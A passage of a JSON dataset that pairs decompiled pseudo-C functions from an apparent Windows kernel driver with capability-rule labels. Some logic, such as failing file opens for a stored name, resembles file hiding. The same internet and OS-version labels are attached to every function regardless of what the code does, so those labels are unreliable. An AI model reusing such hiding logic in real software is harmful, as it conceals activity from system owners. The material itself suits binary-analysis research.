        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00017160(void)\n\n{\n    int16_t iVar1;\n    uint var_2a8h;\n    uint var_2a0h;\n    int16_t *var_29ch;\n    uint var_298h;\n    uint *var_294h;\n    int32_t var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint *var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_68h;\n    uint var_10h;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_8h = 0;\n    if (*0x800cdc44 != 0) {\n        return 0;\n    }\n    *0x800cdc44 = 1;\n    fcn.000789c0(&var_298h, 0x8005164c);\n    var_28ch = 0x18;\n    var_288h = 0;\n    var_280h = 0x240;\n    var_284h = &var_298h;\n    var_27ch = 0;\n    var_278h = 0;\n    var_290h = fcn.00078a0e(&var_8h, 1, &var_28ch);\n    if (var_290h != 0) {\n        return var_290h;\n    }\n    var_294h = &var_270h;\n    var_298h._0_2_ = 0;\n    var_298h._2_2_ = 0x206;\n    var_290h = fcn.00078a02(var_8h, &var_298h, 0);\n    if (var_290h == 0) {\n        for (var_4h = &var_274h + (var_298h >> 1) * 2 + 2;\n            (((*var_4h == 0x5c || (*var_4h == 0x2f)) || (*var_4h == 0x20)) || (*var_4h == 9)); var_4h = var_4h + -1) {\n        }\n        var_4h[1] = 0;\n        var_4h = fcn.00078a14(&var_270h, 0x5c);\n        if (var_4h != NULL) {\n            var_29ch = var_4h;\n            do {\n                iVar1 = *var_29ch;\n                var_29ch = var_29ch + 1;\n            } while (iVar1 != 0);\n            if ((var_29ch - (var_4h + 1) >> 1) + 1U < 0x105) {\n                fcn.00078a08(0x800cc800, var_4h + 1, 0x104);\n                fcn.0002c180(&var_68h, 0x52);\n                fcn.000789c6(0x800cca08, 0x52, 0x80051644, &var_68h);\n                fcn.000789c6(&var_270h, 0x104, 0x800514f4, &var_68h);\n                fcn.000789c0(&var_298h, &var_270h);\n                var_28ch = 0x18;\n                var_288h = 0;\n                var_280h = 0x240;\n                var_284h = &var_298h;\n                var_27ch = 0;\n                var_278h = 0;\n                var_290h = fcn.000789de(&var_8h, 0x100000, &var_28ch, &var_10h, 7, 0x21);\n                if ((var_290h == 0) && (var_290h = (**0x8005129c)(var_8h, 0, 0, 0, &var_274h, 0),  var_290h == 0)) {\n                    if (*(var_274h + 8) == 0) {\n                        (**0x800512e0)();\n                    }\n                    else {\n                        *0x800cdc4c = *(*(var_274h + 8) + 0xc);\n                        (**0x800512e4)();\n                        *0x800cdc48 = *(*(var_274h + 8) + 8);\n                        (**0x800512e4)();\n                        (**0x800512e0)();\n                        var_290h = fcn.00016000(*0x800cdc48, 0x80057660, 0x800578e0);\n                        fcn.00037440(0x800ccaac);\n                        var_290h = fcn.00016020(0, 0x80057660, 0x800578e0, 0xc, 1);\n                    }\n                }\n                goto code_r0x000174ce;\n            }\n        }\n        var_290h = -1;\n    }\ncode_r0x000174ce:\n    if (var_290h != 0) {\n        fcn.00017500();\n    }\n    if (var_8h != 0) {\n        fcn.000789b4(var_8h);\n    }\n    return var_290h;\n}\n",
        "token_count": 1228
    },
    "00017500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00017500(void)\n\n{\n    if (*0x800cdc44 != 0) {\n        *0x800cdc44 = 0;\n        if (*0x800cdc48 != 0) {\n            fcn.000160b0(*0x800cdc48);\n            (**0x800512e0)();\n            *0x800cdc48 = 0;\n        }\n        fcn.00016130(0, 0x80057660, 0x800578e0, 0xc, 1);\n        fcn.000376a0(0x800ccaac);\n        if (*0x800cdc4c != 0) {\n            (**0x800512e0)();\n            *0x800cdc4c = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "000175b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.000175b0(void)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint var_318h;\n    uint var_110h;\n    uint var_4h;\n    \n    if (((*0x800cdc44 != 0) && (iVar1 = fcn.000294e0(10, &var_110h, 0x104, &var_31ch),  iVar1 == 0)) &&\n       (iVar1 = fcn.00037880(&var_110h, &var_318h, 0x104),  iVar1 != -1)) {\n        fcn.00037640(0x800ccaac, &var_4h, 1);\n        fcn.00078a08(0x800ccab8, &var_318h, 0x100);\n        *0x800cdc50 = *0x800ccab8 != 0;\n        fcn.00037670(0x800ccaac, &var_4h, 1);\n    }\n    return;\n}\n",
        "token_count": 235
    },
    "00017660": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00017660(uint arg_8h, int32_t arg_ch, uchar *arg_10h, uint *arg_14h)\n\n{\n    char *pcVar1;\n    int16_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint var_24h;\n    uint var_1ch;\n    int16_t *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    *arg_10h = 1;\n    if (*0x800cdc44 != 0) {\n        *arg_14h = 0x103;\n        cVar3 = fcn.0001fa30();\n        if (cVar3 == '\\0') {\n            pcVar1 = *(arg_ch + 0x60);\n            if (((*pcVar1 == '\\f') && (pcVar1[1] == '\\x01')) ||\n               ((*pcVar1 == '\\0' && (iVar4 = fcn.00078a1a(),  iVar4 != *(*0x800cc770 + 0x14))))) {\n                iVar4 = *(pcVar1 + 0x18);\n                if ((*(iVar4 + 0x34) != 0) && (*(iVar4 + 0x30) != 0)) {\n                    for (var_ch = *(iVar4 + 0x30) >> 1; (var_ch != 0 && (*(*(iVar4 + 0x34) + -2 + var_ch * 2) == 0x5c));\n                        var_ch = var_ch - 1) {\n                    }\n                    for (var_8h = 0; (*(*(iVar4 + 0x34) + var_8h * 2) == 0x5c && (var_8h < var_ch)); var_8h = var_8h + 1\n                        ) {\n                    }\n                    var_ch = var_ch - var_8h;\n                    var_18h = 0x800cc800;\n                    piVar2 = var_18h;\n                    do {\n                        var_18h = piVar2;\n                        piVar2 = var_18h + 1;\n                    } while (*var_18h != 0);\n                    uVar7 = var_18h + 0x3ff99c00 >> 1;\n                    if ((var_ch == 0) ||\n                       (iVar5 = fcn.000789a8(*(iVar4 + 0x34) + var_8h * 2, 0x800cc800, uVar7),  iVar5 != 0)) {\n                        if ((*0x800cdc50 != 0) && (*pcVar1 != '\\0')) {\n                            uVar6 = fcn.00016240(arg_8h, arg_ch, 0x80057910, arg_14h);\n                            return uVar6;\n                        }\n                    }\n                    else if (*pcVar1 == '\\0') {\n                        for (var_8h = var_8h + uVar7; (*(*(iVar4 + 0x34) + var_8h * 2) == 0x5c && (var_8h < var_ch));\n                            var_8h = var_8h + 1) {\n                        }\n                        if ((var_ch - var_8h != 0) &&\n                           (iVar4 = fcn.000789a8(*(iVar4 + 0x34) + var_8h * 2, 0x800cca08, var_ch - var_8h),  iVar4 == 0\n                           )) {\n                            *arg_10h = 0;\n                            *(arg_ch + 0x18) = 0xc0000034;\n                            (**0x800512e8)();\n                            return *(arg_ch + 0x18);\n                        }\n                    }\n                    else if (uVar7 == var_ch) {\n                        uVar6 = fcn.00016240(arg_8h, arg_ch, 0x80057910, arg_14h);\n                        return uVar6;\n                    }\n                }\n            }\n            else if (*pcVar1 == '\\n') {\n                uVar6 = fcn.00016240(arg_8h, arg_ch, 0x80057b00, 0);\n                return uVar6;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 998
    },
    "00017910": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00017910(uint param_1, int32_t param_2, int32_t *param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    int32_t var_ch;\n    int32_t *var_10h;\n    uint var_18h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8d20;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    if (((var_10h == NULL) || (var_ch == 0)) || (*(var_ch + 0x22) < *(var_ch + 0x23))) {\n        uVar1 = 0xc0000005;\n    }\n    else {\n        iVar4 = *(var_ch + 0x60);\n        if (((iVar4 == 0) || (*(iVar4 + 0x14) == 0)) || (*(*(iVar4 + 0x14) + 8) == 0)) {\n            uVar1 = 0xc0000005;\n        }\n        else {\n            if (*(var_ch + 0x18) == 0) {\n                iVar2 = (**0x8005128c)(*(var_ch + 0x3c), *(var_ch + 0x1c), 0, 0, 0);\n                if (iVar2 == 0) {\n                    *(var_ch + 0x18) = 0xc000009a;\n                    uVar1 = *(var_ch + 0x18);\n                    goto code_r0x00017ae9;\n                }\n                var_4h = 0;\n                (**0x80051298)(iVar2, 0, 2);\n                iVar3 = fcn.00017c00(*(iVar4 + 0xc), *(var_ch + 0x3c), *(var_ch + 0x1c));\n                var_4h = 0xffffffff;\n                (**0x80051294)(iVar2);\n                (**0x800512a4)(iVar2);\n                if (*(var_ch + 0x18) == 0) {\n                    if ((iVar3 == -1) && ((*(iVar4 + 2) & 4) == 0)) {\n                        *(iVar4 + 2) = *(iVar4 + 2) & 0xfe;\n                        *(var_ch + 0x23) = *(var_ch + 0x23) + '\\x01';\n                        *(var_ch + 0x60) = *(var_ch + 0x60) + 0x24;\n                        iVar4 = (**0x80051288)();\n                        if (iVar4 != 0x103) {\n                            *var_10h = iVar4;\n                        }\n                        uVar1 = 0xc0000016;\n                        goto code_r0x00017ae9;\n                    }\n                    *(var_ch + 0x1c) = iVar3;\n                }\n            }\n            uVar1 = fcn.00016510(var_8h, var_ch);\n        }\n    }\ncode_r0x00017ae9:\n    *in_FS_OFFSET = var_10h_2;\n    return uVar1;\n}\n",
        "token_count": 801
    },
    "00017b00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00017b00(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_ch != 0) && (*(arg_ch + 0x23) <= *(arg_ch + 0x22))) {\n        if (*(*(arg_ch + 0x60) + 8) == 3) {\n            iVar1 = *(arg_ch + 0xc);\n            uVar4 = 0x6400000 / (*(iVar1 + 0x10) * *(iVar1 + 0x14));\n            uVar2 = *(iVar1 + 8);\n            *(iVar1 + 8) = uVar4 + *(iVar1 + 8);\n            *(iVar1 + 0xc) = *(iVar1 + 0xc) + CARRY4(uVar4, uVar2);\n        }\n        else if (*(*(arg_ch + 0x60) + 8) == 7) {\n            puVar3 = *(arg_ch + 0xc);\n            uVar4 = 0x6400000 / (puVar3[6] * puVar3[7]);\n            uVar2 = *puVar3;\n            *puVar3 = uVar4 + *puVar3;\n            puVar3[1] = puVar3[1] + CARRY4(uVar4, uVar2);\n            uVar2 = puVar3[2];\n            puVar3[2] = uVar4 + puVar3[2];\n            puVar3[3] = puVar3[3] + CARRY4(uVar4, uVar2);\n            uVar2 = puVar3[4];\n            puVar3[4] = uVar4 + puVar3[4];\n            puVar3[5] = puVar3[5] + CARRY4(uVar4, uVar2);\n        }\n    }\n    fcn.00016510(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 499
    },
    "00017ed0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00017ed0(int32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t *var_44h;\n    int32_t *var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint var_30h;\n    int32_t *var_2ch;\n    uint var_28h;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    var_ch = 0;\n    var_1ch = arg_8h;\n    do {\n        iVar1 = *var_1ch;\n        var_1ch = var_1ch + 2;\n    } while (iVar1 != 0);\n    fcn.00037640(0x800ccaac, &var_8h, 0);\n    var_4h = 0x800ccab8;\n    do {\n        if ((var_4h == NULL) || (*var_4h == 0)) goto code_r0x000180ac;\n        var_10h = fcn.000789f0(var_4h, 0x3a);\n        if (var_10h == NULL) {\n            var_2ch = var_4h;\n            do {\n                iVar1 = *var_2ch;\n                var_2ch = var_2ch + 2;\n            } while (iVar1 != 0);\n            iVar2 = var_2ch - (var_4h + 2);\n        }\n        else {\n            iVar2 = var_10h - var_4h;\n            var_10h = var_10h + 2;\n        }\n        var_14h = iVar2 >> 1;\n        if (var_14h <= var_1ch - (arg_8h + 2) >> 1) {\n            var_40h = var_4h;\n            var_44h = arg_8h;\n            for (var_3ch = var_14h << 1; 3 < var_3ch; var_3ch = var_3ch - 4) {\n                if (*var_44h != *var_40h) goto code_r0x00017fed;\n                var_40h = var_40h + 1;\n                var_44h = var_44h + 1;\n            }\n            if (var_3ch == 0) {\ncode_r0x0001806f:\n                var_4ch = 0;\n            }\n            else {\ncode_r0x00017fed:\n                var_48h = *var_44h - *var_40h;\n                if (var_48h == 0) {\n                    if (var_3ch == 1) goto code_r0x0001806f;\n                    var_48h = *(var_44h + 1) - *(var_40h + 1);\n                    if (var_48h == 0) {\n                        if (var_3ch == 2) goto code_r0x0001806f;\n                        var_48h = *(var_44h + 2) - *(var_40h + 2);\n                        if (var_48h == 0) {\n                            if ((var_3ch == 3) || (var_48h = *(var_44h + 3) - *(var_40h + 3),  var_48h == 0))\n                            goto code_r0x0001806f;\n                        }\n                    }\n                }\n                var_4ch = 1;\n                if (var_48h < 1) {\n                    var_4ch = -1;\n                }\n            }\n            if (var_4ch == 0) {\n                var_ch = 1;\ncode_r0x000180ac:\n                fcn.00037670(0x800ccaac, &var_8h, 0);\n                return var_ch;\n            }\n        }\n        var_4h = var_10h;\n    } while( true );\n}\n",
        "token_count": 961
    },
    "000180d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000180d0(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    if (arg_ch == NULL) {\n        var_4h = 0;\n        for (var_8h = 0; *(arg_8h + var_8h * 4) != 0; var_8h = var_8h + 1) {\n            for (var_10h = 0;\n                (*(*(arg_8h + var_8h * 4) + 0x1c) != 0 && (*(*(*(arg_8h + var_8h * 4) + 0x1c) + var_10h * 4) != 0));\n                var_10h = var_10h + 1) {\n                var_4h = var_4h + 1;\n            }\n            var_4h = var_4h + 1;\n        }\n    }\n    else {\n        var_4h = 1;\n        for (var_8h = 0; *(arg_8h + var_8h * 4) != 0; var_8h = var_8h + 1) {\n            for (var_10h = 0;\n                (*(*(arg_8h + var_8h * 4) + 0x1c) != 0 && (*(*(*(arg_8h + var_8h * 4) + 0x1c) + var_10h * 4) != 0));\n                var_10h = var_10h + 1) {\n                if (*arg_ch < *(*(*(*(arg_8h + var_8h * 4) + 0x1c) + var_10h * 4) + 4)) {\n                    var_4h = var_4h + 1;\n                    var_ch = var_ch + 1;\n                }\n            }\n            if (var_ch != 0) {\n                var_4h = var_4h + 1;\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 508
    },
    "00018280": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00018280(int16_t **arg_8h, int32_t **arg_ch, uint noname_2, uint32_t arg_14h, int32_t *arg_18h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int16_t *piVar3;\n    uint var_60h;\n    int16_t *var_5ch;\n    int16_t *var_58h;\n    uint var_50h;\n    int16_t *var_4ch;\n    int16_t *var_48h;\n    uint var_44h;\n    uint var_3ch;\n    int16_t *var_38h;\n    uint var_34h;\n    uint var_2ch;\n    int16_t *var_28h;\n    uint var_24h;\n    int32_t *var_4h;\n    \n    if (arg_8h == NULL) {\n        uVar2 = 0xc0000001;\n    }\n    else if ((arg_14h == 0) || (arg_8h[6] + *arg_18h <= arg_14h)) {\n        var_28h = *arg_8h;\n        piVar3 = var_28h + 1;\n        do {\n            iVar1 = *var_28h;\n            var_28h = var_28h + 1;\n        } while (iVar1 != 0);\n        var_4h = fcn.000356c0((var_28h - piVar3 >> 1) * 2 + 0x90);\n        if (var_4h == NULL) {\n            uVar2 = 0xc000009a;\n        }\n        else {\n            fcn.00078bfa(var_4h, 0, 0x70);\n            var_4h[1] = var_4h + 0x8e;\n            var_38h = *arg_8h;\n            piVar3 = var_38h + 1;\n            do {\n                iVar1 = *var_38h;\n                var_38h = var_38h + 1;\n            } while (iVar1 != 0);\n            *var_4h = (var_38h - piVar3 >> 1) * 2 + 2;\n            var_48h = *arg_8h;\n            var_4ch = var_4h[1];\n            do {\n                iVar1 = *var_48h;\n                *var_4ch = iVar1;\n                var_48h = var_48h + 1;\n                var_4ch = var_4ch + 1;\n            } while (iVar1 != 0);\n            var_4h[5] = var_4h + 0x1c;\n            var_4h[4] = 0x1e;\n            var_58h = fcn.00018210(arg_8h[5], &var_24h);\n            var_5ch = var_4h[5];\n            do {\n                iVar1 = *var_58h;\n                *var_5ch = iVar1;\n                var_58h = var_58h + 1;\n                var_5ch = var_5ch + 1;\n            } while (iVar1 != 0);\n            var_4h[9] = var_4h + 10;\n            var_4h[8] = 4;\n            *var_4h[9] = arg_8h[6];\n            var_4h[0xd] = var_4h + 0xe;\n            var_4h[0xc] = 4;\n            *var_4h[0xd] = arg_8h[2];\n            var_4h[0x11] = var_4h + 0x12;\n            var_4h[0x10] = 4;\n            *var_4h[0x11] = arg_8h[3];\n            var_4h[0x15] = var_4h + 0x16;\n            var_4h[0x14] = 4;\n            *var_4h[0x15] = arg_8h[1];\n            var_4h[0x19] = var_4h + 0x1a;\n            var_4h[0x18] = 4;\n            *var_4h[0x19] = arg_8h[4];\n            *arg_ch = var_4h;\n            if (arg_18h != NULL) {\n                *arg_18h = *arg_18h + arg_8h[6];\n            }\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0xc000009a;\n    }\n    return uVar2;\n}\n",
        "token_count": 1064
    },
    "00018500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00018500(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 0;\n    var_14h = 0;\n    do {\n        if (*(arg_8h + var_1ch * 4) == 0) {\n            return 0;\n        }\n        arg_8h_00 = *(arg_8h + var_1ch * 4);\n        bVar3 = arg_10h == NULL;\n        if (!bVar3) {\n            var_4h = 0;\n            while( true ) {\n                if ((*(arg_8h_00 + 0x1c) == 0) || (*(*(arg_8h_00 + 0x1c) + var_4h * 4) == 0)) goto code_r0x00018597;\n                if (*arg_10h < *(*(*(arg_8h_00 + 0x1c) + var_4h * 4) + 4)) break;\n                var_4h = var_4h + 1;\n            }\n            bVar3 = true;\n        }\ncode_r0x00018597:\n        if (bVar3) {\n            fcn.00018280(arg_8h_00, arg_ch + var_14h * 4, 1, arg_14h, arg_18h);\n            var_14h = var_14h + 1;\n            for (var_4h = 0; (*(arg_8h_00 + 0x1c) != 0 && (*(*(arg_8h_00 + 0x1c) + var_4h * 4) != 0));\n                var_4h = var_4h + 1) {\n                if ((arg_10h == NULL) || (*arg_10h < *(*(*(arg_8h_00 + 0x1c) + var_4h * 4) + 4))) {\n                    iVar1 = fcn.00018280(*(*(arg_8h_00 + 0x1c) + var_4h * 4), arg_ch + var_14h * 4, 0, arg_14h, arg_18h)\n                    ;\n                    var_14h = var_14h + 1;\n                    if (iVar1 != 0) {\n                        uVar2 = fcn.00078a2c(iVar1);\n                        return uVar2;\n                    }\n                }\n            }\n        }\n        var_1ch = var_1ch + 1;\n    } while( true );\n}\n",
        "token_count": 687
    },
    "00018680": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00018680(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.000356c0(0x1c);\n    if (arg_8h_00 == NULL) {\n        arg_8h_00 = NULL;\n    }\n    else {\n        *arg_8h_00 = 0;\n        arg_8h_00[1] = 0;\n        arg_8h_00[2] = 0;\n        arg_8h_00[3] = 0;\n        arg_8h_00[4] = 0;\n        arg_8h_00[5] = 0;\n        arg_8h_00[6] = 0;\n        iVar1 = fcn.000356c0(arg_ch * 2 + 2);\n        *arg_8h_00 = iVar1;\n        if (*arg_8h_00 == 0) {\n            fcn.000357f0(arg_8h_00);\n            arg_8h_00 = NULL;\n        }\n        else {\n            fcn.00078be8(*arg_8h_00, arg_8h, arg_ch << 1);\n            *(*arg_8h_00 + arg_ch * 2) = 0;\n        }\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 334
    },
    "00018710": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00018710(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int32_t *arg_8h_00;\n    int32_t iVar2;\n    uint var_24h;\n    uint var_1ch;\n    int16_t *var_18h;\n    uint var_14h;\n    uint var_ch;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.000356c0(0x20);\n    if (arg_8h_00 == NULL) {\n        arg_8h_00 = NULL;\n    }\n    else {\n        *arg_8h_00 = 0;\n        arg_8h_00[1] = 0;\n        arg_8h_00[2] = 0;\n        arg_8h_00[3] = 0;\n        arg_8h_00[4] = 0;\n        arg_8h_00[5] = 0;\n        arg_8h_00[6] = 0;\n        arg_8h_00[7] = 0;\n        if (*arg_8h == 0) {\n            iVar2 = fcn.000356c0(0x208);\n            *arg_8h_00 = iVar2;\n            if (*arg_8h_00 == 0) {\n                fcn.000357f0(arg_8h_00);\n                return NULL;\n            }\n            fcn.0002bf70(*arg_8h_00, 0x104);\n        }\n        else {\n            var_8h = arg_8h;\n            do {\n                iVar1 = *var_8h;\n                var_8h = var_8h + 1;\n            } while (iVar1 != 0);\n            if (arg_8h[(var_8h - (arg_8h + 1) >> 1) + -1] == 0x5c) {\n                iVar2 = fcn.000358b0(arg_8h);\n                *arg_8h_00 = iVar2;\n                if (*arg_8h_00 == 0) {\n                    fcn.000357f0(arg_8h_00);\n                    return NULL;\n                }\n            }\n            else {\n                var_18h = arg_8h;\n                do {\n                    iVar1 = *var_18h;\n                    var_18h = var_18h + 1;\n                } while (iVar1 != 0);\n                iVar2 = fcn.000356c0((var_18h - (arg_8h + 1) >> 1) * 2 + 4);\n                *arg_8h_00 = iVar2;\n                if (*arg_8h_00 == 0) {\n                    fcn.000357f0(arg_8h_00);\n                    return NULL;\n                }\n                fcn.00078a20(*arg_8h_00, 0x80051664, arg_8h);\n            }\n        }\n        arg_8h_00[5] = 0x10;\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 708
    },
    "00018890": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00018890(uint arg_8h, int32_t *arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_290h;\n    uint *var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint *var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    int32_t var_26ch;\n    uint32_t var_268h;\n    int32_t var_264h;\n    uint32_t var_260h;\n    int32_t var_25ch;\n    uint32_t var_258h;\n    int32_t var_254h;\n    uint32_t var_250h;\n    int32_t var_24ch;\n    uint var_248h;\n    uint *var_240h;\n    int32_t var_23ch;\n    uint var_238h;\n    int32_t var_234h;\n    uint var_230h;\n    uint var_24h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_1ch = 0;\n    var_238h = 0x268;\n    var_288h = NULL;\n    if (arg_10h == NULL) {\n        var_26ch = 0x21590066;\n    }\n    else {\n        arg_10h[7] = 0;\n        var_23ch = fcn.000356c0(0x268);\n        if (var_23ch == 0) {\n            var_26ch = 0x21590004;\n        }\n        else {\n            var_1ch = var_23ch;\n            fcn.00078bfa(var_23ch, 0, var_238h);\n            var_288h = fcn.000356c0(4);\n            if (var_288h == NULL) {\n                var_26ch = 0x21590004;\n            }\n            else {\n                *var_288h = 0;\n                fcn.000789c0(&var_10h, arg_8h);\n                fcn.00036970(&var_230h, 0x104, *arg_10h);\n                fcn.000789c0(&var_290h, &var_230h);\n                var_284h = 0x18;\n                var_280h = 0;\n                var_278h = 0x40;\n                var_27ch = &var_290h;\n                var_274h = 0;\n                var_270h = 0;\n                var_234h = fcn.0001f080(&var_8h, 0x100001, &var_284h, &var_24h, 0, 0x80, 7, 1, 0x10, 0, 0);\n                if (var_234h == 0) {\n                    var_234h = fcn.00078a38(var_8h, &var_24h, &var_268h, 0x28, 4);\n                    if (var_234h == 0) {\n                        uVar1 = fcn.00078bee(var_258h + 0x2ac18000, (var_254h + -0x19db1de) - (var_258h < 0xd53e8000), \n                                             10000000, 0);\n                        arg_10h[1] = uVar1;\n                        uVar1 = fcn.00078bee(var_268h + 0x2ac18000, (var_264h + -0x19db1de) - (var_268h < 0xd53e8000), \n                                             10000000, 0);\n                        arg_10h[2] = uVar1;\n                        uVar1 = fcn.00078bee(var_250h + 0x2ac18000, (var_24ch + -0x19db1de) - (var_250h < 0xd53e8000), \n                                             10000000, 0);\n                        arg_10h[4] = uVar1;\n                        uVar1 = fcn.00078bee(var_260h + 0x2ac18000, (var_25ch + -0x19db1de) - (var_260h < 0xd53e8000), \n                                             10000000, 0);\n                        arg_10h[3] = uVar1;\n                        arg_10h[5] = var_248h;\n                    }\n                    arg_10h[6] = 0;\n                    var_18h = 0;\n                    var_4h = 0;\n                    while (var_234h = fcn.00078a26(var_8h, 0, 0, 0, &var_24h, var_1ch, var_238h, 3, 1, &var_10h, \n                                                   var_18h == 0),  var_234h == 0) {\n                        if ((((*(var_23ch + 0x3c) >> 1 != 1) ||\n                             (iVar2 = fcn.00078a32(var_23ch + 0x5e, 0x8005166c, 1),  iVar2 != 0)) &&\n                            ((*(var_23ch + 0x3c) >> 1 != 2 ||\n                             (iVar2 = fcn.00078a32(var_23ch + 